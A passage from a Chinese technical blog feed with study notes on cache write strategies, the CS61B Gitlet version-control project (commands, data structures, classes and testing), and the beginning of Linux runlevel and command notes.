<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403232058444.png" alt="image.png"></p>
<p><em><strong>1、Read Through 策略</strong></em></p>
<p>先查询缓存中数据是否存在，如果存在则直接返回如果不存在，则由缓存组件负责从数据库查询数据，并将结果写入到缓存组件，最后缓存组件将数据返回给应用。</p>
<p><em><strong>2、Write Through 策略</strong></em></p>
<p>当有数据更新的时候，先查询要写入的数据在缓存中是否已经存在：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>如果缓存中数据已经存在，则更新缓存中的数据，并且由缓存组件同步更新到数据库中，然后缓存组件告知应用程序更新完成。</p>
</li>
<li class="lvl-2">
<p>如果缓存中数据不存在，直接更新数据库，然后返回；</p>
</li>
</ul>
<h2 id="4-3-Write-Back（写回策略）">4.3 Write Back（写回策略）</h2>
<p>Write Back（写回）策略，即写入时复制(Copy On Write)，在更新数据的时候，只更新缓存，同时将缓存数据设置为脏的，然后立马返回，并不会更新数据库。对于数据库的更新，会通过批量异步更新的方式进行。</p>
<p>实际上，Write Back（写回）策略也不能应用到我们常用的数据库和缓存的场景中，因为 Redis 并没有异步更新数据库的功能。</p>
<p>Write Back 是计算机体系结构中的设计，比如 CPU 的缓存、操作系统中文件系统的缓存都采用了 Write Back（写回）策略。</p>
<p><strong>Write Back 策略特别适合写多的场景</strong>，因为发生写操作的时候， 只需要更新缓存，就立马返回了。比如，写文件的时候，实际上是写入到文件系统的缓存就返回了，并不会写磁盘。</p>
<h2 id="4-4-Write-Behind-Pattern（异步缓存写入）">4.4 Write Behind Pattern（异步缓存写入）</h2>
<p>Write Behind Pattern 和 Read/Write Through Pattern 很相似，两者都是由 cache 服务来负责 cache 和 db 的读写。</p>
<p><strong>Read/Write Through 是同步更新 cache 和 db，而 Write Behind 则是只更新缓存，不直接更新 db，而是改为异步批量的方式来更新 db。</strong></p>
<p><a href="https://blog.csdn.net/qq_51513626/article/details/134997228">旁路缓存模式（Cache-Aside Pattern）如何保证一致性的问题-CSDN博客</a></p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Redis</tag>
        <tag>缓存</tag>
      </tags>
  </entry>
  <entry>
    <title>CS61B: Gitlet</title>
    <url>/2023/01/18/%E9%A1%B9%E7%9B%AE/CS61B%20Gitlet/</url>
    <content><![CDATA[<p>Gitlet支持的主要功能：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Saving the contents of entire directories of files. In Gitlet, this is called <mark>committing</mark>, and the saved contents themselves are called <mark>commits</mark>.</p>
</li>
<li class="lvl-2">
<p>Restoring a version of one or more files or entire commits. In Gitlet, this is called <mark>checking out</mark> those files or that commit.</p>
</li>
<li class="lvl-2">
<p>Viewing the history of your backups. In Gitlet, you view this history in something called the <mark>log</mark>.</p>
</li>
<li class="lvl-2">
<p>Maintaining related sequences of commits, called <mark>branches</mark>.</p>
</li>
<li class="lvl-2">
<p><mark>Merging</mark> changes made in one branch into another.</p>
</li>
</ul>
<h1>1 概述</h1>
<p>HEAD(the head pointer)跟踪当前分支的最新commit</p>
<p>线性的提交commit是链表数据结构<img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202307271134364.png" alt="image.png"><br>
可以通过Branch构成Tree结构<br>
<img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202307271136987.png" alt="image.png"></p>
<p>detatched head state：当checkout到一个特定当前分支过时的commit</p>
<h1>2 内部结构(Internal Structures)</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>blobs</strong>：保存的文件内容，Gitlet会保存文件的不同版本，一个文件可能对应多个<code>blob</code>。</p>
</li>
<li class="lvl-2">
<p><strong>trees</strong>：目录结构将文件名映射到<code>blob</code>和其他<code>tree</code>（子目录）</p>
</li>
<li class="lvl-2">
<p><strong>commits</strong>：包含<code>log</code>信息，其他元数据（提交日期、作者等），对<code>tree</code>的引用，对父节点的引用</p>
</li>
</ul>
<p>Gitlet在Git基础上进行了简化：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>将<code>trees</code>嵌入到<code>commits</code>中；即在commits中通过哈希表记录文件名到<code>blob</code>的映射关系</p>
</li>
<li class="lvl-2">
<p>只能对两个节点进行<code>merge</code>操作；</p>
</li>
<li class="lvl-2">
<p>限制<code>commits</code>包括的数据信息。包括log message、timestamp、(file name, blob reference)、parent reference、second parent reference（for merge）</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202307281036355.png" alt="image-20230728103620289"><br>
每个blob和每个commit都有一个独特的id作为对对象的引用，将blob和commit序列化(将任意的结构变为连续字节流)为字节流，通过加密哈希函数(SHA-1)对于一个序列的字节流计算160bit的整数哈希值。哈希值根据文件内容计算而来，可以用于文件寻址，或者比较文件内容是否相同。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>repository：版本库，存储提交的不同版本文件</p>
</li>
<li class="lvl-2">
<p><strong>working directory</strong>：工作区，除了<code>.gitlet</code>之外的文件</p>
</li>
<li class="lvl-2">
<p><strong>staging area</strong></p>
</li>
</ul>
<h1>3 gitlet仓库结构</h1>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403112034856.png" alt="image.png"></p>
<h1>4 merge</h1>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202311151547732.png" alt="CS61B-pro2.png"></p>
<h1>5 Gitlet Commands</h1>
<p><code>java gitlet.Main command args</code></p>
<h2 id="5-1-init">5.1 init</h2>
<p>创建新的版本控制系统，自动以一个默认提交<code>initial commit</code>开始，默认有一个<code>master</code>分支。<code>HEAD</code>指向<code>heads/master</code>分支，即存储<code>heads/master</code>内容；创建默认<code>commit</code>，将<code>id</code>存入<code>refs/heads/master</code>分支。</p>
<p>当前目录已经存在一个版本控制系统时，报错<code>A Gitlet version-control system already exists in the current directory.</code>。</p>
<h2 id="5-2-add">5.2 add</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>将当前工作区的文件副本添加到暂存区(staging area)，不存储文件实体，只记录根据文件内容得到的SHA值</p>
</li>
<li class="lvl-2">
<p>文件已经在暂存区，用新内容覆盖暂存区的文件</p>
</li>
<li class="lvl-2">
<p>工作区文件内容与head commit跟踪的一样，不添加到暂存区，暂存区如果存在则移除；如果文件在暂存区处于待移除状态，文件不在被暂存为移除状态(removal)<br>
$$<br>
version:1 \rightarrow version:2 \rightarrow add \rightarrow version:1 \rightarrow add<br>
$$</p>
</li>
<li class="lvl-2">
<p>文件不处于工作区：<code>File does not exist.</code></p>
</li>
<li class="lvl-2">
<p>区别：gitlet一次只能添加一个文件</p>
</li>
</ul>
<blockquote>
<p>得到文件内容的hash值得到暂存区跟踪文件条目(addition、removal)<br>
文件内容与head跟踪的文件不一样(或head没有跟踪此文件)​		更新暂存区(addition)相关条目否则​		将文件移除暂存区(addition)</p>
<p>(如果文件存在于暂存区(removal)，移除文件)<br>
将暂存区状态写回文件</p>
</blockquote>
<h2 id="5-3-commit">5.3 commit</h2>
<blockquote>
<p>保存HEAD和暂存区中跟踪文件的快照以便将来恢复，创建一个新的<code>commit</code></p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>每个commit跟踪的文件默认与父节点相同</p>
</li>
<li class="lvl-2">
<p>通过add添加的文件更新文件版本(更新了父节点跟踪的文件)</p>
</li>
<li class="lvl-2">
<p>添加添加到暂存区但未被父节点跟踪的文件</p>
</li>
<li class="lvl-2">
<p>通过rm移除的文件解除跟踪失败情况：</p>
</li>
<li class="lvl-2">
<p>没有文件处于暂存区：<code>No changes added to the commit.</code></p>
</li>
<li class="lvl-2">
<p>提交信息为空：<code>Please enter a commit message.</code></p>
</li>
<li class="lvl-2">
<p>commit命令不添加、修改、移除工作区中的文件</p>
</li>
<li class="lvl-2">
<p><mark>在add、rm命令后对文件的修改将被commit忽略</mark>(此时checkout为head时，不改变工作区内容，实际HEAD commit内容与当前工作区不同)</p>
</li>
</ul>
<blockquote>
<p>读取暂存区addition，removal<br>
读取父节点commit跟踪的文件parentFile，文件项为(filename, id)，id为SHA-1值将addition中的文件项添加到parentFile中将removal中的文件从parentFile中移除</p>
<p>清空暂存区将commit和stage写回文件</p>
</blockquote>
<h2 id="5-4-rm">5.4 rm</h2>
<blockquote>
<p>rm时，只是暂时记录在暂存区，commit时，才根据stage修改commit跟踪的文件</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>文件位于暂存区，处于待添加状态，将文件移除暂存区(addition)</p>
</li>
<li class="lvl-2">
<p>文件被head commit跟踪，将文件从工作区移除，添加到暂存区(removal)</p>
</li>
<li class="lvl-2">
<p>文件不处于暂存区，也未被head commit跟踪，<code>No reason to remove the file.</code></p>
</li>
<li class="lvl-2">
<p>实现时暂存区(removal)采用哈希集合实现，文件如果被修改过，和head commit不一样，这时无法判断，因为没有记录文件内容SHA-1值</p>
</li>
<li class="lvl-2">
<p>被移除的文件(removal)是否可以再次添加（无法直接通过文件名添加，但可以再次创建同样文件内容文件添加）</p>
</li>
</ul>
<blockquote>
<p>得到暂存区跟踪文件条目(addition、removal)<br>
文件不在暂存区(addition)，也未被父节点跟踪<code>No reason to remove the file.</code><br>
文件在暂存区(addition)中从addition中移除否则添加到removal中<mark>从工作区中移除文件</mark></p>
</blockquote>
<h2 id="5-5-log">5.5 log</h2>
<blockquote>
<p>从HEAD指向的commit开始，沿着commit tree；对于merge commit(由两个commit合并得来)，则沿着第一个父节点commit，打印commit历史记录<br>
<img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202311052138169.png" alt="image.png"></p>
</blockquote>
<blockquote>
<p>读取HEAD指向的commit id<br>
从当前commit id进行深度优先搜索<code>CommitGraph.DFS(commit)</code></p>
</blockquote>
<h2 id="5-6-global-log">5.6 global-log</h2>
<blockquote>
<p>打印所有的commit信息</p>
</blockquote>
<p>因为实现时没有将commit和blob分开存放，所以无法通过迭代一个目录下所有文件的方式实现。作为替代，存储了数据结构<code>commit-graph</code>数据结构，包含所有的commit</p>
<p><code>Map&lt;String, LinkedList&lt;String&gt;&gt; g</code>包含了节点到父节点的信息</p>
<h2 id="5-7-find">5.7 find</h2>
<blockquote>
<p>输出具有相同commit message信息的commit id</p>
</blockquote>
<p>复用了global-log相关代码，添加<code>findMessage</code>标记</p>
<h2 id="5-8-status">5.8 status</h2>
<blockquote>
<p>显示所有分支和暂存区信息</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>Branches</p>
</li>
<li class="lvl-2">
<p>Staged Files(addition)</p>
</li>
<li class="lvl-2">
<p>Removed Files(removal)</p>
</li>
<li class="lvl-2">
<p>Modifications Not Staged For Commit</p>
<ul class="lvl-2">
<li class="lvl-6">添加到addition，后续修改文件内容导致与工作区中文件不同(modified)</li>
<li class="lvl-6">添加到addition，但从工作区删除(deleted)</li>
<li class="lvl-6"><mark>被current commit跟踪，在工作区中修改后，没有暂存</mark>（没有添加到removal）(modified)</li>
<li class="lvl-6">被current commit跟踪，没有添加到removal，从工作区删除(deleted)</li>
</ul>
</li>
<li class="lvl-2">
<p>Untracked Files</p>
<ul class="lvl-2">
<li class="lvl-6">存在于工作区，没有添加到addition，也没有被current commit跟踪</li>
<li class="lvl-6">添加到removal，后续重新创建了文件</li>
</ul>
</li>
</ul>
<h2 id="5-9-checkout">5.9 checkout</h2>
<blockquote>
<ol>
<li class="lvl-3">
<p><code>java gitlet.Main checkout -- [file name]</code>：用HEAD commit中的文件替换工作区中的文件</p>
</li>
<li class="lvl-3">
<p><code>java gitlet.Main checkout [commit id] -- [file name]</code>：用指定id的commit中的文件替换工作区中的文件</p>
</li>
<li class="lvl-3">
<p><code>java gitlet.Main checkout [branch name]</code>：将给定branch的最新提交的文件签出到工作区，给定的branch签出后将被认为当前branch。被当前branch跟踪但没有被check-out branch跟踪的文件将被删除。</p>
</li>
</ol>
</blockquote>
<p>工作区中的文件未被跟踪，在签出后将被覆盖</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>There is an untracked file in the way; delete it, or add and commit it first.</code></p>
</li>
<li class="lvl-2">
<p>被cur commit跟踪，但后续修改文件导致文件内容变化，同时被checkout commit跟踪</p>
</li>
<li class="lvl-2">
<p>文件在工作区，但cur commit未跟踪，checkout commit跟踪</p>
</li>
</ul>
<p><strong>Differences from real git</strong>: Real git does not clear the staging area and stages the file that is checked out. Also, it won’t do a checkout that would overwrite or undo changes (additions or removals) that you have staged.</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>针对第二种命令格式，实现<code>checkoutCommit(String commitID, String filename)</code>，签出指定commit的对应文件到当前工作区</p>
</li>
<li class="lvl-2">
<p>第一种命令，先查询当前分支的commitID，再调用<code>checkoutCommit(String commitID, String filename)</code></p>
</li>
<li class="lvl-2">
<p>第三种命令</p>
<ul class="lvl-2">
<li class="lvl-6">先检查是否存在未被跟踪的文件</li>
<li class="lvl-6">读取branch对应的commit所跟踪的文件列表</li>
<li class="lvl-6">一次签出每一个文件</li>
<li class="lvl-6">将branch信息写回到HEAD中</li>
</ul>
</li>
</ul>
<h2 id="5-10-branch">5.10 branch</h2>
<blockquote>
<p>用指定名字创建一个新的分支，新的分支指向HEAD commit，一个分支仅仅是对commit节点的引用<br>
<img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202311061020077.png" alt="image.png"></p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202311061021668.png" alt="image.png"></p>
<blockquote>
<p>All that creating a branch does is to give us a new pointer. At any given time, one of these pointers is considered the currently active pointer, also called the HEAD pointer (indicated by *). We can switch the currently active head pointer with <code>checkout [branch name]</code>. Whenever we commit, it means we add a child commit to the currently active HEAD commit even if there is already a child commit.</p>
</blockquote>
<h2 id="5-11-rm-branch">5.11 rm-branch</h2>
<blockquote>
<p>删除指定分支，即删除heads目录下存储的与分支相关联的指针</p>
</blockquote>
<p><code>java gitlet.Main rm-branch [branch name]</code><br>
删除指定的branch，只是删除与branch相关联的指针（存储在refs/heads/*下的文件，指向当前branch的最新提交)。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>branch不存在时，<code>A branch with that name does not exist.</code></p>
</li>
<li class="lvl-2">
<p>移除当前所在的分支，<code>Cannot remove the current branch.</code></p>
</li>
</ul>
<h2 id="5-12-reset">5.12 reset</h2>
<p><code>java gitlet.Main reset [commit id]</code></p>
<blockquote>
<p>签出指定commit的文件移除工作区中被tracked但不在指定签出commit的文件当前branch的头节点指向指定commit</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>与checkout第三种一样，也许检查，<code>There is an untracked file in the way; delete it, or add and commit it first.</code></p>
</li>
<li class="lvl-2">
<p>移除被当前commit跟踪但没有出现在check out commit中的文件</p>
</li>
<li class="lvl-2">
<p>签出指定commit中的文件</p>
</li>
<li class="lvl-2">
<p>将当前commit写入HEAD指向的分支</p>
</li>
<li class="lvl-2">
<p>清空暂存区</p>
</li>
</ul>
<p>以下属于未被tracked的两中情况</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>工作区中的文件不存在commit中时</p>
</li>
<li class="lvl-2">
<p>工作区中的文件与commit不同，但与reset中相同</p>
</li>
</ul>
<h2 id="5-13-merge">5.13 merge</h2>
<blockquote>
<p>将given branch合并到current branch<br>
<code>If an untracked file in the current commit would be overwritten or deleted by the merge：</code></p>
</blockquote>
<p>首先找到两个分支的split point（最近公共祖先）<br>
<img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202311151036122.png" alt="image.png"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>split point与given branch相同：<code>Given branch is an ancestor of the current branch.</code></p>
</li>
<li class="lvl-2">
<p>split point与current branch相同：相当于签出given branch，<code>Current branch fast-forwarded.</code></p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202311151058707.png" alt="CS61B-pro2.png"><br>
修改方式不一样：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>对文件内容修改，并且修改后内容不一样</p>
</li>
<li class="lvl-2">
<p>一个文件内容修改，另一个删除</p>
</li>
<li class="lvl-2">
<p>split point不存在该文件，current branch和given branch具有该文件的不同内容此处也是与git不一致的地方，显示冲突时，显示完整文件内容<br>
 Real Git does a more subtle job of merging files, displaying conflicts only in places where both files have changed since the split point.</p>
</li>
<li class="lvl-2">
<p>遍历split point跟踪的文件</p>
<ul class="lvl-2">
<li class="lvl-6">
<p>cur和given都有该文件</p>
<ul class="lvl-4">
<li class="lvl-10">given修改了文件
<ul class="lvl-6">
<li class="lvl-14">cur没修改文件(情况1)</li>
<li class="lvl-14">cur也修改了文件，并且两者改动不一样</li>
</ul>
</li>
</ul>
</li>
<li class="lvl-6">
<p>cur不存在该文件，given存在</p>
<ul class="lvl-4">
<li class="lvl-10">given如果修改了文件，则两者修改方式不一样</li>
</ul>
</li>
<li class="lvl-6">
<p>given不存在该文件，cur存在</p>
<ul class="lvl-4">
<li class="lvl-10">cur没有修改该文件，因为given将文件移除，所以移除该文件</li>
<li class="lvl-10">cur修改了该文件，则两者修改方式不一致</li>
</ul>
</li>
</ul>
</li>
<li class="lvl-2">
<p>遍历given跟踪的文件（given新增了文件(cur可能有该文件但内容不一样，也可能没有)）</p>
<ul class="lvl-2">
<li class="lvl-6">split中没有该文件
<ul class="lvl-4">
<li class="lvl-10">cur没有该文件（checkout, tracked）</li>
<li class="lvl-10">两者文件内容不一样，则两者修改方式不一样</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="5-14-add-remote">5.14 add-remote</h2>
<p><code>java gitlet.Main add-remote [remote name] [name of remote directory]/.gitlet</code></p>
<blockquote>
<p>添加远端仓库地址</p>
</blockquote>
<p>读取跟踪的远端仓库判断name是否存在，不存在则记录映射关系</p>
<h2 id="5-15-rm-remote">5.15 rm-remote</h2>
<blockquote>
<p>移除远端仓库地址</p>
</blockquote>
<p>读取跟踪的远端仓库判断是否存在，若存在</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>解除跟踪，<code>remoteDir</code></p>
</li>
<li class="lvl-2">
<p>删除<code>refs/remotes/name</code>跟踪的分支</p>
</li>
</ul>
<h2 id="5-16-push">5.16 push</h2>
<p><code>java gitlet.Main push [remote name] [remote branch name]</code></p>
<blockquote>
<p>将本地仓库的修改推送到远端对应的分支（remote name记录的时远端.gitlet目录地址）当前分支包括远端分支未知的一些提交</p>
</blockquote>
<p>DFS搜索当前分支的commit记录判断远端仓库对应分支的最新commit是否在记录中</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>将中间的commit推送到远端</p>
</li>
</ul>
<p>修改远端仓库对应分支的最新commit<br>
修改本地仓库<code>refs/remote/name/branch</code>跟踪的commit</p>
<h2 id="5-17-fetch">5.17 fetch</h2>
<p><code>java gitlet.Main fetch [remote name] [remote branch name]</code></p>
<blockquote>
<p>将远端仓库commit拉到本地仓库，<code>[remote name]/[remote branch name]</code>指向head commit</p>
</blockquote>
<p>遍历远端仓库分支的commit记录读取本地跟踪的<code>refs/remote/name/branch</code>最新的commit</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>将中间的commit拉取到本地修改<code>refs/remote/name/branch</code>跟踪最新的commit</p>
</li>
</ul>
<h2 id="5-18-pull">5.18 pull</h2>
<blockquote>
<p>与fetch相同，不过还需与当前分支merge</p>
</blockquote>
<p><code>Modifications Not Staged For Commit</code> and <code>Untracked Files</code></p>
<h1>6 类及其功能</h1>
<h2 id="6-1-Main">6.1 Main</h2>
<blockquote>
<p>处理命令行输入的命令参数，根据输入的命令调用<code>Repository</code>的相关方法，同时验证命令行参数输入的有效性。如果输入不正确的命令，或者命令对应的参数不正确，则打印相关错误信息。</p>
</blockquote>
<h3 id="6-1-1-Method">6.1.1 Method</h3>
<ol>
<li class="lvl-3">
<p><code>public static void main(String[] args)</code>：程序入口，根据输入的命令参数执行相应的过程</p>
</li>
<li class="lvl-3">
<p><code>public static void validateNumArgs(String cmd, String[] args, int n)</code>：验证参数个数是否正确，对于<code>checkout</code>命令单独处理，因为该命令可以多种不同参数个数的调用格式</p>
</li>
</ol>
<h2 id="6-2-Commit">6.2 Commit</h2>
<blockquote>
<p>处理每次commit任务，包括创建commit数据结构信息(包括提交信息，提交日期，父节点，跟踪的文件名)</p>
</blockquote>
<h3 id="6-2-1-Fields">6.2.1 Fields</h3>
<ol>
<li class="lvl-3">
<p><code>private String message</code></p>
</li>
<li class="lvl-3">
<p><code>private String date</code></p>
</li>
<li class="lvl-3">
<p><code>private LinkedList&lt;String&gt; parentID</code></p>
</li>
<li class="lvl-3">
<p><code>private Map&lt;String, String&gt; dict</code></p>
</li>
</ol>
<h3 id="6-2-2-Method">6.2.2 Method</h3>
<ol>
<li class="lvl-3">
<p><code>public Commit()</code>：默认构造方法，再<code>init</code>时候生成初始<code>commit</code>信息</p>
</li>
<li class="lvl-3">
<p><code> public static String getCommitHashVal(), getCommitHashVal(String branch)</code>：无参数时默认读取当前HEAD指向的commit，否则读取相应分支下的最近一次commit</p>
</li>
<li class="lvl-3">
<p><code>public static Commit readCommit(String commitHashVal)</code>：根据commit的哈希值读取对应的文件，反序列化得到<code>Commit</code>数据结构</p>
</li>
<li class="lvl-3">
<p><code> public void setInfo(String message, LinkedList&lt;String&gt; parentID)</code>：设置<code>Commit</code>的相关信息，在<code>Commit</code>时，首先读取父节点的数据结构，对父节点的数据结构进行处理得到当前<code>commit</code></p>
</li>
<li class="lvl-3">
<p><code> public void writeCommit()</code>：将<code>Commit</code>数据结构利用序列化存储到一个暂时的文件当中，计算文件的hash，然后再将文件根据hash移动到指定位置。更新<code>CommitTrie</code>和<code>CommitGraph</code>数据结构，将hash值写到当前分支中，以跟踪当前分支的最新一次提交。</p>
</li>
</ol>
<h2 id="6-3-CommitGraph">6.3 CommitGraph</h2>
<h3 id="6-3-1-Fields">6.3.1 Fields</h3>
<p><code>private Map&lt;String, LinkedList&lt;String&gt;&gt; g</code>：邻接链表存储，存储当前commit的父节点信息</p>
<h3 id="6-3-2-Mehod">6.3.2 Mehod</h3>
<ol>
<li class="lvl-3">
<p><code>public static void DFS(String cur)</code>：深度优先搜索，从当前cur表示的commit出发，不断递归其第一个父节点，直至到达初始提交</p>
</li>
<li class="lvl-3">
<p><code>public static void BFS(boolean findMessage, String message)</code>：参数作为标志，如果<code>findMessage</code>为<code>true</code>，对应<code>find</code>命令，找到是否有提交信息为<code>message</code>的<code>commit</code>；否则对应<code>global-log</code>命令，打印处所有的<code>commit</code>信息。</p>
</li>
<li class="lvl-3">
<p><code>private static void printCommit(String cur, Commit commit)</code>：格式打印当前cur表示的commit的相关信息</p>
</li>
<li class="lvl-3">
<p><code> public static String latestCommonAncestor(String p, String q)</code>：找到p和q对应的commit的最近公共父节点。</p>
</li>
<li class="lvl-3">
<p><code>public void addEdge(String u, String v)</code>：添加u到v的边，其中u为当前<code>commit</code>，v为父节点</p>
</li>
</ol>
<h2 id="6-4-CommitTrie">6.4 CommitTrie</h2>
<blockquote>
<p>保存<code>commit</code>的hash值的数据结构，字典树实现，用于在给定<code>uid</code>时快速查找到对应的<code>commit</code></p>
</blockquote>
<h3 id="6-4-1-Fields">6.4.1 Fields</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>LinkedList&lt;String&gt; commit</code>：存在于当前节点的<code>commit</code>的hash值</p>
</li>
<li class="lvl-2">
<p><code>CommitTrie[] son</code>：子节点</p>
</li>
</ul>
<h3 id="6-4-2-Method">6.4.2 Method</h3>
<ol>
<li class="lvl-3">
<p><code> public static void insert(String commitID, CommitTrie root)</code>：将commit对应的hash插入到字典树当中</p>
</li>
<li class="lvl-3">
<p><code>public static String query(String commitID, CommitTrie root)</code>：查询具有给定<code>uid</code>的<code>commit</code></p>
</li>
</ol>
<h2 id="6-5-Repository">6.5 Repository</h2>
<h2 id="6-6-remoteRepo">6.6 remoteRepo</h2>
<blockquote>
<p>处理<code>add-remote</code>、<code>rm-remote</code>、<code>push</code>、<code>fetch</code>、<code>pull</code>命令，完成本地仓库与远端仓库的交互逻辑，远端仓库在本地模拟，给定路径作为远端仓库地址。</p>
</blockquote>
<h3 id="6-6-1-Fields">6.6.1 Fields</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>private Map&lt;String, String&gt; remoteDir</code>：保存(远端仓库名，远端地址)，这一数据结构保存在<code>CONFIG</code>中</p>
</li>
</ul>
<h3 id="6-6-2-Method">6.6.2 Method</h3>
<ol>
<li class="lvl-3">
<p><code>public static void addRemote(String name, String path)</code>：添加远端仓库，并在本地<code>.gitlet/refs/remotes/</code>目录下添加远端仓库名文件夹，用以存储远端仓库的分支</p>
</li>
<li class="lvl-3">
<p><code>public static void rmRemote(String name)</code>：从<code>remoteDir</code>数据结构中移除远端仓库，并将本地<code>.gitlet/refs/remotes/</code>目录下的用以跟踪远端仓库的文件夹及其内的分支删除</p>
</li>
<li class="lvl-3">
<p><code>public static void push(String name, String branch)</code>：将本地当前分支的修改推送到远端仓库，远端分支的头节点需为当前分支的历史节点。将远端分支和本地分支之间提交的commits推送到远端仓库，远端分支跟踪的头节点需进行更新。</p>
</li>
<li class="lvl-3">
<p><code>private static void copyCommit(String commitHash, File src, File dst)</code>：将<code>commitHash</code>跟踪的所有文件和存储commit数据结构的文件从<code>src</code>目录复制到<code>dst</code>目录</p>
</li>
<li class="lvl-3">
<p><code>public static void fetch(String name, String branch)</code>：将远端仓库的修改拉到本地仓库，根据远端仓库<code>refs/heads/branch</code>记录的commit与本地仓库<code>refs/remote/name/branch</code>下记录的commit，可以追踪本地没有的commit。</p>
</li>
<li class="lvl-3">
<p><code>public static void pull(String name, String branch)</code>：与fetch相比，该命令还需将拉取的分支与本地分支合并(代码复用，利用Repository.merge实现)。</p>
</li>
</ol>
<h1>7 测试</h1>
<p>测试文件存放在<code>proj2\testing\samples</code>目录下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//运行所有测试，是否输出额外信息</span><br><span class="line">make check</span><br><span class="line">make check TESTER_FLAGS=&quot;--verbose&quot;</span><br><span class="line">//测试单个文件</span><br><span class="line">python3 tester.py --verbose --keep FILE.in</span><br></pre></td></tr></table></figure>
<h1>8 参考</h1>
<p><a href="https://sp21.datastructur.es/materials/proj/proj2/proj2#merge">Project 2: Gitlet | CS 61B Spring 2021 (datastructur.es)</a><br>
<a href="https://sp21.datastructur.es/materials/lab/lab6/lab6">Lab 6: Getting Started on Project 2 | CS 61B Spring 2021 (datastructur.es)</a>（Serialization Details）<br>
<a href="https://zhuanlan.zhihu.com/p/533852291">CS61B Gitlet入坑指南 - 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>project</category>
      </categories>
  </entry>
  <entry>
    <title></title>
    <url>/2024/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/Linux/</url>
    <content><![CDATA[<h1>1 Linux运行级别</h1>
<p>Linux系统有七个运行级别，分别用数字0-6表示。每个运行级别都会启动或停止不同的系统服务和进程，以满足不同的系统需求。</p>
<p>​1.我们可以使用 <strong>runlevel</strong> 命令，进行查看</p>
<p>2.我们可以使用 <strong>who -r</strong> 命令进行查看</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>运行等级</strong></td>
<td><strong>描述</strong></td>
<td><strong>命令参数</strong></td>
</tr>
<tr>
<td><strong>0</strong></td>
<td>关机模式，系统默认运行级别不能设置为0，否则不能正常启动，一开机就自动关机</td>
<td><strong>shutdown.target</strong></td>
</tr>
<tr>
<td><strong>1</strong></td>
<td>单用户模式，root权限，用于系统维护，禁止远程登录，就像Windows下的安全模式</td>
<td><strong>emergency.target</strong></td>
</tr>
<tr>
<td><strong>2</strong></td>
<td>多用户模式，没有 NFS 网络支持</td>
<td><strong>rescure.target</strong></td>
</tr>
<tr>
<td><strong>3</strong></td>
<td>完整的多用户文本模式，有 NFS，登录后进入控制台命令模式</td>
<td><strong>multi-user.target</strong></td>
</tr>
<tr>
<td><strong>4</strong></td>
<td>系统未使用，保留一般不用</td>
<td><strong>无</strong></td>
</tr>
<tr>
<td><strong>5</strong></td>
<td>图形化模式，登陆后进入图形 GUI 模式</td>
<td><strong>graphical.target</strong></td>
</tr>
<tr>
<td><strong>6</strong></td>
<td>重启模式，默认运行级别不能设为6，否则不能设为6，否则不能正常启动，就会一直开机重启</td>
<td><strong>无</strong></td>
</tr>
</tbody>
</table>
<p>​</p>
<p>我们怎么查看系统在启动时默认的运行等级呢?</p>
<p>可以使用 <strong>systemctl get-default</strong> 命令进行查看<br>
 <strong>systemctl set-default multi-user.target</strong></p>
<p>要改变Linux的运行级别，可以使用以下方法：使用runlevel命令查看当前系统的运行级别。使用init命令切换运行级别。修改/etc/inittab文件中的运行级别。使用systemctl命令设置默认运行级别。使用systemctl命令立即切换到指定的运行级别。</p>
<h1>2 Linux常用命令</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>chmod：更改文件或目录的权限。</p>
</li>
<li class="lvl-2">
<p>cat：查看文件内容</p>
</li>
<li class="lvl-2">
<p>top：inux下常用的性能分析工具，能够实时显示系统中各个进程的资源占用状况.该命令可以提供实时的对系统处理器的状态监视，它会显示系统中CPU最“敏感”的任务列表，并且可以按CPU使用、内存使用和执行时间对任务进行排序</p>
</li>
</ul>
<h2 id="2-1-grep">2.1 grep</h2>
<blockquote>
<p>分析一行信息</p>
</blockquote>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-v</td>
<td>排除选项</td>
</tr>
<tr>
<td>grep -v ‘^$’ filename</td>
<td>^：行首，$：行尾，去掉空行</td>
</tr>
<tr>
